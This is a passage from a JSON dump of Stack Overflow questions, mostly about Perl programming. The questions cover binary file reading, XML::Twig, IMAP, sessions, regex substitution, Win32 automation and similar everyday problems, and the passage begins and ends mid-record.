Xxx, 22 Oct 2012 17:45:00 CET\nFrom: pruebachunga.com\nTo: chimpun@forum.chimpun\nSubject: En un lugar de la mancha\nMessage-Id: 123456789012345656789@8888888888888ldkf\n\nThis is a multi-part message in MIME format.\n\n--_----------=_135100636840600\nContent-Transfer-Encoding: quoted-printable\nContent-Type: text/html\n\n&lt;html&gt;&lt;body&gt;hola &lt;img src=3D\"cid:image\" /&gt; adios &lt;/body&gt;&lt;/html&gt;=\n\n--_----------=_135100636840600\nContent-Id: &lt;image&gt;\nContent-Transfer-Encoding: base64\nContent-Type: image/png; name=\"image.png\"\n\niVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAMAAAEwO1XwAAAAB3RJTUUH1gYE\n...\nkmqg1wGgkx35p/KStnLuw2BGhXwIZqT+D8sxTLVK0VpuAAAAAElFTkSuQmCC\n\n--_----------=_135100636840600--\n</code></pre>\n\n<p><strong>EDIT</strong>:</p>\n\n<p>After read some web, I think that image is an attachmet is a problem of \"Image Blocking\": <a href=\"http://www.campaignmonitor.com/resources/will-it-work/image-blocking/\" rel=\"nofollow\">http://www.campaignmonitor.com/resources/will-it-work/image-blocking/</a></p>\n\n<p>I mantaint my question because any people can find this question interesting. Now I think that this code is correct, and with other message, other ID, other sender... this code can work good.</p>\n"},{"tags":["perl","file","input","binary","byte"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":13191462,"title":"Perl: Reading binary file one byte at a time","body":"<p>I'm writing a tool that needs to read a binary file one byte at a time, process each byte, and potentially take some action depending on the processed value. But for some reason the values Perl is getting are not the same as the data in the file. I'm using code similar to this (stripped down for brevity, but this still exhibits the issue):</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\n\nmy $bytesToProcess = 16;\nmy $fileName = 'datafile.bin';\n\nprint \"Processing $bytesToProcess bytes...\\n\";\n\nopen FILE, \"&lt;:raw\", $fileName or die \"Couldn't open $fileName!\";\n\nfor my $offset (0 .. $bytesToProcess - 1)\n{\n    my $oneByte;\n    read(FILE, $oneByte, 1) or die \"Error reading $fileName!\";\n    printf \"0x%04X\\t0x%02X\\n\", $offset, $oneByte;\n}\n\nclose FILE;\n</code></pre>\n\n<p>Input values (first 16 bytes of data file): <code>50 53 4D 46 30 30 31 35 00 00 70 00 07 3F 10 00</code></p>\n\n<p>Output:</p>\n\n<pre><code>Processing 16 bytes...\n0x0000  0x00\n0x0001  0x00\n0x0002  0x00\n0x0003  0x00\n0x0004  0x00\n0x0005  0x00\n0x0006  0x01\n0x0007  0x05\n0x0008  0x00\n0x0009  0x00\n0x000A  0x00\n0x000B  0x00\n0x000C  0x00\n0x000D  0x00\n0x000E  0x00\n0x000F  0x00\n</code></pre>\n\n<p>Any idea what's going wrong here?</p>\n"},{"tags":["xml","perl","xml-twig"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":24,"score":2,"question_id":13191062,"title":"How can I get tag content with other tags with XML::Twig?","body":"<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings FATAL =&gt; 'all';\nuse 5.010;\n\nuse XML::Twig;\n\nsub get_xml_from_data {\n    my @lines = &lt;DATA&gt;;\n    my $xml = join \"\", @lines;\n\n    return $xml;\n}\n\nsub main {\n    my $xml = get_xml_from_data();\n\n    my $xt = XML::Twig-&gt;new();\n    $xt-&gt;parse($xml);\n    my $root= $xt-&gt;root;\n\n    # output 1\n    say $root-&gt;first_child('element')-&gt;sprint;\n    # It will print:\n    #\n    #   &lt;element&gt;\n    #           Some content with &lt;b&gt;some&lt;/b&gt; &lt;i&gt;&lt;b&gt;other&lt;/b&gt;&lt;/i&gt; tags.\n    #        &lt;/element&gt;\n\n    # output 2\n    say $root-&gt;first_child('element')-&gt;text;\n    # It will print:\n    #\n    #        Some content with some other tags.\n\n\n    # But I need the output:\n    #\n    #           Some content with &lt;b&gt;some&lt;/b&gt; &lt;i&gt;&lt;b&gt;other&lt;/b&gt;&lt;/i&gt; tags.\n\n}\n\nmain();\n\n__DATA__\n&lt;root&gt;\n    &lt;element&gt;\n        Some content with &lt;b&gt;some&lt;/b&gt; &lt;i&gt;&lt;b&gt;other&lt;/b&gt;&lt;/i&gt; tags.\n    &lt;/element&gt;\n&lt;/root&gt;\n</code></pre>\n"},{"tags":["perl","imap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13190245,"title":"Unable to connect to imap server using IMAp::CLient perl module","body":"<pre><code>#!/usr/bin/perl -w\nuse Getopt::Std;\n\nuse IMAP::Client;\n\nmy $imap = new IMAP::Client() ;\n$imap-&gt;connect(PeerAddr =&gt; 'server.domain.com', ConnectMethod =&gt; ' SSL',) or die \"Unable to connect to  \".$imap-&gt;error();\n</code></pre>\n\n<p>I am getting an error </p>\n\n<blockquote>\n  <p>\"Use of uninitialized value in pattern match (m//) at\n  /nas/mtools/perl_modules/lib/site_perl/5.8.9//IMAP/Client.pm line\n  178.\"</p>\n</blockquote>\n\n<p>Could you please help me with this error, i want to automate connection to port 993 using openssl. Any help would be appreciated.</p>\n"},{"tags":["perl","session","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":204,"score":0,"question_id":10089657,"title":"Perl Session management","body":"<p>I am using <a href=\"https://metacpan.org/module/CGI%3a%3aSession\" rel=\"nofollow\"><code>CGI::Session</code></a> for session management in my Perl web application. I am able to\ncreate a session using the <code>file</code> session driver but I am unable to get the existing session and unable to access stored parameters of session.</p>\n\n<p>I am trying to get existing session but it's creating new one\nand query string <code>$CGISESSID</code> both are same but <code>$session</code> here I am getting was different\nit's a totally new one so I am unable to get the stored parameters from session.\nPlease help me to resolve this issue.</p>\n\n<p>Thanks,\nKrishna</p>\n"},{"tags":["perl","command-line"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":56,"score":3,"question_id":13187458,"title":"Inserting lines at the beginning and end of multiple files","body":"<p>I have about 2000 files that I need lines added to the beginning and end of.</p>\n\n<p>I need these lines at the beginning of each files:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"&gt;\n</code></pre>\n\n<p>I also need this to be the last line of each file:</p>\n\n<pre><code>&lt;/urlset&gt;\n</code></pre>\n\n<p>These files are all in the same folder and are all .xml files.</p>\n\n<p>I'm thinking the best and fastest way to do this would be via command line or perl but am really not sure.  I've seen a few tutorials on doing this but I think all the characters that are in the lines I need inserted are whats messing it up.  Any help would be greatly appreciated.  Thanks!</p>\n"},{"tags":["perl","table","extract"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13187647,"title":"extract table perl","body":"<p>I am starting to learn the Perl language as it is very useful for my research. I cannot figure out how to extract a table from a .txt file</p>\n\n<p>I have a folder with a certain number of .txt files named sequentially like this:</p>\n\n<pre><code>1.txt\n2.txt\n3.txt\n...\n...\n1000.txt\n</code></pre>\n\n<p>An example of these files in .txt format can be found at the following link:\n<a href=\"http://www.sec.gov/Archives/edgar/data/1750/000104746909008102/0001047469-09-008102.txt\" rel=\"nofollow\">http://www.sec.gov/Archives/edgar/data/1750/000104746909008102/0001047469-09-008102.txt</a></p>\n\n<p>The .htm version of the same file can be found at the following link:\n<a href=\"http://www.sec.gov/Archives/edgar/data/1750/000104746909008102/a2194264zdef14a.htm\" rel=\"nofollow\">http://www.sec.gov/Archives/edgar/data/1750/000104746909008102/a2194264zdef14a.htm</a></p>\n\n<p>Now, the table I am looking for in these files is called sometimes:</p>\n\n<pre><code>Non-Qualified Deferred Compensation Table\n</code></pre>\n\n<p>some other with small variations like:</p>\n\n<pre><code>Non Qualified Deferred Compensation Table\n</code></pre>\n\n<p>Basically this table has the these words (sometimes they might slightly vary from file to file) in the headers:</p>\n\n<ul>\n<li>\"Contributions\" </li>\n<li>\"Aggregate Earnings\"</li>\n<li>\"Aggregate Withdrawal/Distributions\"</li>\n</ul>\n\n<p>and other headers (with slight variations from file to file, but these words appear pretty much in every \"Deferred Compensation Table\" of each of my .txt files (have a look at the link to the .htm file and .txt file link for an example - search for \"Non-Qualified Deferred Compensation Table\" in the file). Under these headers, there are some amounts in dollars for a certain number of managers (number of table rows varies from file to file).</p>\n\n<p>Is there a way to create a perl script that extract the deferred compensation table from each file and produces a .csv output with all deferred compensation tables (headers and numbers below) stored along with a reference for each table to the .txt file?</p>\n\n<p>Something like this in the output file:</p>\n\n<pre><code>File    Manager Name    Contributions   Aggregate Earnings  Aggregate Withdrawal/Distributions\n1.txt   Manager1    00000   00000   00000\n1.txt   Manager2    00000   00000   00000\n1.txt   Manager3    00000   00000   00000\n2.txt   Manager1    00000   00000   00000\n2.txt   Manager2    00000   00000   00000\n2.txt   Manager3    00000   00000   00000\n3.txt   Manager1    00000   00000   00000\n3.txt   Manager2    00000   00000   00000\n3.txt   Manager3    00000   00000   00000\n</code></pre>\n\n<p>I would be most grateful if you could help me with this. I am a new bie and I am trying to learn Perl, but this specific task seems honestly very hard for me.</p>\n\n<p>Thank you very much in advance for your help.</p>\n\n<p>Kind regards,</p>\n\n<p>Stefano</p>\n"},{"tags":["perl","cpan","activeperl","ppm"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13188187,"title":"ActivePerl ppm issue on Windows 7, installed modules cannot be verified","body":"<p>My ppm was working a few days ago when I installed a number of email related modules, it installs and verifies every module just fine. But now it has an issue, let me give you an example: </p>\n\n<blockquote>\n  <p>ppm install email::simple</p>\n  \n  <p>No missing packages to install</p>\n  \n  <p>ppm verify email::simple </p>\n  \n  <p>ppm verify failed: Package 'email::simple' is not installed</p>\n</blockquote>\n\n<p>I tested with a script I wrote that uses this module and it compile and runs just fine. However, it didn't work out for another module I installed later. </p>\n\n<blockquote>\n  <p>ppm install email::received</p>\n  \n  <p>No missing packages to install</p>\n  \n  <p>ppm verify email::received</p>\n  \n  <p>ppm verify failed: Package 'email::received' is not installed</p>\n  \n  <p>perl test.pl \"FILE\"</p>\n  \n  <p>Can't locate Eamil/Received.pm in @INC (@INC contains: C:/Perl64/site/lib C:/Perl64/lib .) at test.pl line 17.\n  BEGIN failed--compilation aborted at test.pl line 17.</p>\n</blockquote>\n\n<p>I verified myself that the file received.pm was installed under Perl64/site/lib/email/. Why is compiler not recognizing this module? </p>\n\n<p>PS: I can also see the email::received module was installed with the GUI ppm. I tried re-installing ActivePerl but the problem persists</p>\n"},{"tags":["perl","github","markdown","perl-module"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":123,"score":6,"question_id":13188404,"title":"How to make my Perl module's README file compatible with Github's Markdown display?","body":"<p>I've authored the README file in my Perl module in Markdown. Github treats this README file as plain text. I tried renaming the file to \"README.md\"âwhich looks great on Github, but is invisible to Perl tools that look for a file named \"README.\"</p>\n\n<p>Is there any way I can have <em>both</em> a README file, and have my Markdown formatting be interpreted correctly by Github?</p>\n\n<p>The only option I could come up with was to have both a README and a README.md, but I'd prefer not to have to manually keep the two files in sync.</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["perl","unicode","encoding","utf-8","character-encoding"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":13188826,"title":"How to disable implicit decoding (\"upgrading\") in Perl?","body":"<p>Quoting the Perl Unicode FAQ <a href=\"http://perldoc.perl.org/perlunifaq.html#What-if-I-don%27t-decode?\" rel=\"nofollow\">\"What if I don't decode?\"</a></p>\n\n<blockquote>\n  <p>Whenever your encoded, binary string is used together with a text\n  string, Perl will assume that your binary string was encoded with\n  ISO-8859-1, also known as latin-1. If it wasn't latin-1, then your\n  data is unpleasantly converted. For example, if it was UTF-8, the\n  individual bytes of multibyte characters are seen as separate\n  characters, and then again converted to UTF-8. Such double encoding\n  can be compared to double HTML encoding (&amp;amp;gt;), or double URI\n  encoding (%253E).</p>\n  \n  <p>This silent implicit decoding is known as \"upgrading\".\n  That may sound positive, but it's best to avoid it.</p>\n</blockquote>\n\n<p>Disabling this implicit decoding would force the programmer to use <code>decode()</code>/<code>encode()</code> properly and help prevent bugs.</p>\n\n<p>Is it possible to turn off implicit decoding? Ideally, using a binary string together with a text string would result in an error.</p>\n"},{"tags":["perl","ms-word","word","perl-module","win32ole"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":79,"score":4,"question_id":13185835,"title":"Read MS Word table data row wise using win32:ole perl","body":"<p>I am new to win32:ole module in perl. I am trying to print MS word table data row wise on command prompt. But I am able to print only last row of the table. Can you please help me to solve this problem? Thanks in advance.</p>\n\n<p>Below is my  code:</p>\n\n<pre><code>#!/usr/bin/perl \nuse strict;\nuse warnings; \nuse File::Spec::Functions qw( catfile );\nuse Win32::OLE qw(in); \nuse Win32::OLE::Const 'Microsoft Word'; \n$Win32::OLE::Warn = 3; \n\nmy $word = get_word(); \n$word-&gt;{DisplayAlerts} = wdAlertsNone; \n$word-&gt;{Visible} = 1;\nmy $doc = $word-&gt;{Documents}-&gt;Open('C:\\\\PerlScripts\\\\myTest.docx');\nmy $tables = $word-&gt;ActiveDocument-&gt;{'Tables'};\n\nfor my $table (in $tables)\n{\n   my $tableText = $table-&gt;ConvertToText({ Separator =&gt; wdSeparateByTabs });\n   print \"Table: \". $tableText-&gt;Text(). \"\\n\";\n}\n\n$doc-&gt;Close(0); \n\nsub get_word \n{ \n    my $word; \n    eval { $word = Win32::OLE-&gt;GetActiveObject('Word.Application');}; \n    die \"$@\\n\" if $@;\n    unless(defined $word) \n    { \n       $word = Win32::OLE-&gt;new('Word.Application', sub { $_[0]-&gt;Quit }) \n       or die \"Oops, cannot start Word: \", Win32::OLE-&gt;LastError, \"\\n\"; \n    } \n  return $word; \n} \n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":37,"score":-1,"question_id":13186654,"title":"Backslash in RHS of perl string replace","body":"<p>I'm trying to escape a space in a filename inside my Perl program. </p>\n\n<pre><code>$filename = \"This has spaces.csv\";\n$filename =~ s/(\\s)/\\\\${1}/g;\n</code></pre>\n\n<p>'this\\\\ has\\\\ spaces.csv' (two backslashes before the space, not one)</p>\n\n<p>One backslash in the RHS gives me:</p>\n\n<p>this${1}has${1}spaces.csv</p>\n\n<p>What am I missing to get just one backslash in the result?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":13184080,"title":"why does not 'chop' work with <STDIN>?","body":"<p>I am trying to figure out why chop function is not working for me when i try to take the input \nfrom user </p>\n\n<pre><code>  my $string = &lt;STDIN&gt;;\n  my $chr = chop($string);\n  print \"String: $string\\n\";\n  print \"Char: $chr\\n\";\n</code></pre>\n\n<p>output</p>\n\n<pre><code>perl chop.pl\nhello\nString: hello\nChar:\n</code></pre>\n\n<p>but if i use a string, then it works!</p>\n\n<pre><code>my $string = \"frong\";\n  my $chr = chop($string);\n  print \"String: $string\\n\";\n  print \"Char: $chr\\n\";\n</code></pre>\n\n<p>output\n[583]</p>\n\n<pre><code> perl chop.pl\nString: fron\nChar: g\n</code></pre>\n"},{"tags":["perl","template-toolkit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13185635,"title":"Template Toolkit, test for last iteration in a nested loop","body":"<p>I'm using template toolkit to form a simple JSON response (see the code below).\nI need to put a comma after all elements of the response except the last.</p>\n\n<p>I believe I need to make use of TTs iterator, however I'm not getting it right.<br>\nWith this code, a comma is still printed on the end of the last element. </p>\n\n<p>The problem lies with the section that contains</p>\n\n<pre><code>[% UNLESS outer.last &amp;&amp; loop.last %],[% END %]\n</code></pre>\n\n<p>this should add a comma unless the outer and inner loops are on their last iteration.</p>\n\n<p>Any help on what I'm getting wrong greatly appreciated.</p>\n\n<pre><code>{ \"success\": true, \"filesdata\": [\n[%~ USE outer = iterator(objects); FOREACH object IN outer;\n    FOREACH rep IN object.reps;\n        IF rep.rep == reptype %]\n{ \"id\":\"[% object.id | xml %]\", \"url\":\"[% rep.src | xml %]\", \"story\":\"[% object.story | xml %]\" }[% UNLESS outer.last &amp;&amp; loop.last %],[% END %]\n        [%~ END;\n    END;\nEND ~%]\n] }\n</code></pre>\n"},{"tags":["linux","perl","shell","unix"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13185941,"title":"Sftp two levels of authentication with user name password(different user) and rasa key(different user)","body":"<p>I have a shell script to transfer files using sftp without password.But as per my requirement first i have to authenticate using user name and password then i have to transfer files using rsa key without password using functional id.basically here i requires two levels of authentications.i googled it and found not possible with sftp using hard coded password.</p>\n\n<p>Any suggestions really help me so much.</p>\n\n<p>Regards,</p>\n\n<p>Chai</p>\n"},{"tags":["perl","api","file","rackspace-cloud"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":24,"score":2,"question_id":13183867,"title":"Issues with the Perl binding of the Rackspace Cloud API and setting/getting object metadata","body":"<p>Using the unofficial <a href=\"http://search.cpan.org/~ckras/WebService-Rackspace-CloudFiles-1.04/lib/WebService/Rackspace/CloudFiles.pm\" rel=\"nofollow\">Perl binding of the Rackspace Cloud API</a> [<a href=\"https://github.com/Htbaa/WebService-Rackspace-CloudFiles\" rel=\"nofollow\">Github</a>], I can't for the life of me set or retrieve the metadata of a given object.</p>\n\n<p>I can successfully pull files down from the cloud, but when I call <code>object_metadata</code> as defined in the documentation I get an error complaining about <code>uninitialized value</code>. I can verify through the Cloud Files manager that a value is set for <code>Status</code> in the metadata. I've even tried checking for <code>X-Object-Meta-Status</code> (with no success).</p>\n\n<p>Relevant code is as follows:</p>\n\n<pre><code># authentication\n# set $container to pre-made container\nmy @files = $container-&gt;objects(prefix =&gt; 'tainted/')-&gt;all;\nFILE: foreach my $file(@files) {\n\n  # throws undefined // have tried capitalized and not, quotes and none\n  next FILE if $file-&gt;object_metadata-&gt;{'status'} != '-1';\n\n  # download file from object &amp; do stuff with it\n\n  # does not update object in cloud (not sure if anything id done locally)\n  $file-&gt;object_metadata({ status =&gt; $status });\n\n}\n</code></pre>\n\n<p>Like I said, objects are successfully being retrieved, I just am not able to view meta on a given file. I've played with some variations of what is above, but each test of a new approach costs bandwidth (money!). Any help would be very much appreciated!</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13184918,"title":"Perl regexp with $1 and /e","body":"<p>I'm making a regexp constructor. \nBut when running:</p>\n\n<pre><code>my $text = 'a a a';\nmy $replace = '$1/$2-$3';\n$text =~ s/(\\w) (\\w+) (\\w+)/$replace/gmi;\n</code></pre>\n\n<p>$text here = '$1/$2-$3';\nSo $1,$2,$3 are not changed but placed as they are in $replace. How would i make it use $replace content as manually printed replate pattern?</p>\n"},{"tags":["linux","perl","bash","ubuntu","centos"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":13182278,"title":"Does Perl have su or similar command?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4991001/how-to-successfully-run-perl-script-with-setuid-when-used-as-cgi-bin\">How to successfully run Perl script with setuid() when used as cgi-bin?</a>  </p>\n</blockquote>\n\n\n\n<p>I am running my Perl script as root, and would like to have these commands run as <code>$USER</code></p>\n\n<pre><code>mkdir bin\ncp -r /opt/gitolite .\ngitolite/install -ln\ngitolite setup -pk ${USER}.pub\nrm ${USER}.pub\n\nmkdir -p .gitolite/hooks/common\nln -s /opt/pre-receive .gitolite/hooks/common/\n</code></pre>\n\n<p><strong>Question</strong></p>\n\n<p>Does Perl have a <code>su -c \"mkdir bin\" $USER</code> or something similar?</p>\n"},{"tags":["python","json","perl","shell","sar"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":13183657,"title":"Tool to convert sar data to JSON format","body":"<p>Does anyone know any tool in python, perl, or shell, to convert the SAR data into json format?</p>\n"},{"tags":["perl","vim"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":72,"score":-2,"question_id":13182428,"title":"in perl(V5.8.8) do we have a command line editor?","body":"<p>Is there a command line editor(like vi or vim) for perl version 5.8.8, without having to install additional plugins or modules?</p>\n\n<p>edit: I wanted to know if i can edit my program from the command line by being able to open the.pl file directly  or do i always have to open my program file through an external text editor and make the changes?</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":74,"score":2,"question_id":13183006,"title":"simple perl addition program going wrong?","body":"<p>Hi i am a novice perl learner this simple perl program </p>\n\n<pre><code>$inputline= &lt;STDIN&gt;;\nprint \"first input\";\nprint( $inputline); \n$inputline=&lt;STDIN&gt;;\nprint \"second input\";\nprint($inputline);\n$sum= $inputline+$inputline;\nprint\"sum 1stinput and 2ndinput\";\nprint($sum);\n</code></pre>\n\n<p>output</p>\n\n<pre><code>perl count.pl\n3\n4\nfirst input3\nsecond input4\nsum 1stinput and 2ndinput : 8\n</code></pre>\n\n<p>why is the output 8 instead of being 7?</p>\n"},{"tags":["perl","mojolicious","mojolicious-lite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":13182202,"title":"How to use common template for mojolocious lite app?","body":"<pre><code> use Mojolicious::Lite;\n\n  # /with_layout\n  get '/a' =&gt; sub {  my $self = shift;} ;\n  get '/b' =&gt; sub { my $self = shift;} ; \n  get '/c' =&gt; sub { my $self = shift;};\n\napp-&gt;start;\n__DATA__\n\n@@ a.html.ep\n  &lt;!DOCTYPE html&gt;\n  &lt;html&gt;\n    &lt;head&gt;&lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;\n    &lt;body&gt;&lt;%= content %&gt;&lt;/body&gt;\n &lt;table border=\"1\"&gt;\n&lt;tr&gt;\n&lt;td&gt;row 1, cell 1&lt;/td&gt;\n&lt;td&gt;row 1, cell 2&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;row 2, cell 1&lt;/td&gt;\n&lt;td&gt;row 2, cell 2&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt; \n  &lt;/html&gt;\n\n@@ b.html.ep\n  &lt;!DOCTYPE html&gt;\n  &lt;html&gt;\n    &lt;head&gt;&lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;\n    &lt;body&gt;&lt;%= content %&gt;&lt;/body&gt;\n &lt;table border=\"1\"&gt;\n&lt;tr&gt;\n&lt;td&gt;row 1, cell 1&lt;/td&gt;\n&lt;td&gt;row 1, cell 2&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;row 2, cell 1&lt;/td&gt;\n&lt;td&gt;row 2, cell 2&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt; \n  &lt;/html&gt;\n\n\n@@ c.html.ep\n  &lt;!DOCTYPE html&gt;\n  &lt;html&gt;\n    &lt;head&gt;&lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;\n    &lt;body&gt;&lt;%= content %&gt;&lt;/body&gt;\n    &lt;table border=\"1\"&gt;\n&lt;tr&gt;\n&lt;td&gt;row 1, cell 1&lt;/td&gt;\n&lt;td&gt;row 1, cell 2&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;row 2, cell 1&lt;/td&gt;\n&lt;td&gt;row 2, cell 2&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt; \n  &lt;/html&gt;\n</code></pre>\n\n<p>I am really moved </p>\n\n<pre><code> &lt;table border=\"1\"&gt;\n    &lt;tr&gt;\n    &lt;td&gt;row 1, cell 1&lt;/td&gt;\n    &lt;td&gt;row 1, cell 2&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n    &lt;td&gt;row 2, cell 1&lt;/td&gt;\n    &lt;td&gt;row 2, cell 2&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;/table&gt; \n</code></pre>\n\n<p>and use all the html rather adding into each html</p>\n"},{"tags":["perl","terminal","screen","perl-faq"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1055,"score":5,"question_id":4605593,"title":"How do I clear the screen in a terminal using Perl?","body":"<p>I would like to clear the screen in a terminal/console using Perl. How can I do that?</p>\n\n<hr>\n\n<p>This is a question from the <a href=\"http://faq.perl.org\">official perlfaq</a>. We're <a href=\"http://meta.stackoverflow.com/questions/24244/can-we-import-the-perlfaq-into-stackoverflow\">importing the perlfaq to Stack Overflow</a>.</p>\n"},{"tags":["perl","rose-db-object"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":13181664,"title":"RoseDB error on trying to run .pl script","body":"<p>when I try to run this .pl script:</p>\n\n<pre><code>\\#!/usr/bin/perl\n\nuse strict;\n\nuse abc::abcBill;\nuse abc::abcBill::Manager;\n\nabc::abcBill::Manager-&gt;update_abcBill(\n set =&gt; {  mb_status=&gt;'Purged' },\n where=&gt;[  mb_created_date =&gt; { ls =&gt; '2012-05-01 00:00:00' } ],\n debug =&gt;1\n);\n</code></pre>\n\n<p>The error I get is:</p>\n\n<p><strong>Can't locate object method \"update_abcBill\" via package \"abc::abcBill::Manager\"</strong> </p>\n\n<p>I have checked my  <code>abcBill::Manager</code>, and I have a <code>make_manager</code> method there, but it just wont compile the .pl script.</p>\n"},{"tags":["perl","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":13178485,"title":"How to execute many (~15) bash commands in Perl?","body":"<p>I know of <code>system()</code> and <code>qx()</code>, but I need to execute ~15 bash commands. E.g.</p>\n\n<p><code>mkdir</code>, <code>chown</code>, <code>edquota -p user1 -u user2</code>, <code>cp -r</code>, <code>su - username</code>, <code>git</code>, <code>rm</code>, <code>ln -s</code></p>\n\n<p><strong>Question</strong></p>\n\n<p>Is there an efficient way to execute many Bash commands in Perl?</p>\n\n<p>I don't care in this case about the output.</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":97,"score":1,"question_id":10671857,"title":"how to match a particular tag value and the get the result from the previous tag after matching?","body":"<p><strong>Input file:</strong></p>\n\n<pre><code>&lt;TABLE BORDER=\"7\" CELLPADDING=\"10\"&gt;\n&lt;TR&gt;\n&lt;TD&gt;This is a TD cell&lt;/TD&gt;\n&lt;TD&gt;&lt;PRE&gt; sample&lt;/PRE&gt;&lt;/TD&gt;\n&lt;TH&gt;This is a TH cell&lt;/TH&gt;\n&lt;/TR&gt;\n&lt;TR&gt;\n&lt;TH VALIGN=\"TOP\"&gt;Text aligned top&lt;/TH&gt;\n&lt;TH&gt;Image in TH cell with default alignments ---&gt;&lt;/TH&gt;\n&lt;TH&gt;&lt;IMG SRC=\"blylplne.gif\" ALT=\"airplane\"&gt;&lt;/TH&gt;\n&lt;/TR&gt;\n&lt;/TABLE&gt;\n</code></pre>\n\n<p>I like to match the tag <code>&lt;TD&gt;&lt;PRE&gt; sample&lt;/PRE&gt;&lt;/TD&gt;</code> and if it is matched i like to get the result from the previous tag which is <code>&lt;TD&gt;This is a TD cell&lt;/TD&gt;</code></p>\n\n<p><strong>Output:</strong></p>\n\n<blockquote>\n  <p>This is a TD cell</p>\n</blockquote>\n\n<p>I tried with the below code:</p>\n\n<pre><code>MY $Output = m/&lt;TD.*?\\/TD&gt;/;\n</code></pre>\n\n<p>I am able to match the tag but unable to get the result from the previous tag by matching the same.Can any one let me out with it.\nThanks in advance.</p>\n"},{"tags":["perl","registry"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13177891,"title":"Accessing registry keys without WOW6432Node redirection","body":"<p>I have 32 bit Perl installed on 64 bit Windows. \nI want to change  64 bit application's registry key's value. I have tried this:</p>\n\n<pre><code>$Registry-&gt;{\"LMachine/SOFTWARE/Microsoft/Microsoft SQL Server/MSSQL.1/MSSQLServer\"}-&gt;SetValue(\"LoginMode\", $value, REG_DWORD);\n</code></pre>\n\n<p>Windows redirects it to <code>LMachine/SOFTWARE/WOW6432Node/Microsoft/Microsoft SQL Server/MSSQL.1/MSSQLServer</code> .  How can I access actual 64 bit key without redirection to WOW6432Node node?</p>\n\n<p>I'm using Win32::TieRegistry.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13177022,"title":"Escape special character at text","body":"<p>I am reading a xml file, and I add some additional text, but I can't get exact text because some special characters automatically converted.</p>\n\n<p>I try this:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;book&gt;\n  &lt;book-meta&gt;\n    &lt;book-id pub-id-type=\"doi\"&gt;1545&lt;/book-id&gt;\n    &lt;book-title&gt;Regenerating &lt;?tex?&gt; the Curriculum&lt;/book-title&gt;\n  &lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>Script:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\n\nuse XML::Twig;\n\nopen(my $out, '&gt;', 'Output.xml') or die \"can't Create stroy file $!\\n\";\n\nmy $story_file = XML::Twig-&gt;new(\n    